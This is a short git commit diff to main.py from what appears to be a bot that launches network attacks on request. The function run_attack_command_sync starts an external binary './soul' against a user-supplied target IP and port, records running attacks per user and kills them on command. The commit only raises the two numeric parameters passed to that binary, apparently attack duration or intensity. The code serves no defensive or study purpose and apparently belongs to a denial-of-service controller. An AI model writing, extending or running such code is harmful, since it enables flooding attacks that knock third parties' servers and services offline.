0cf6ba5de045d6c7a423a4b4c1a0bb033c527f1b
tufanmahata <165796265+tufanmahata@users.noreply.github.com>
2026-07-07 08:47:57 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -18,7 +18,7 @@ if os.path.exists('./soul'):
 def run_attack_command_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "300"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./soul", target_ip, str(target_port), "300", "400"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
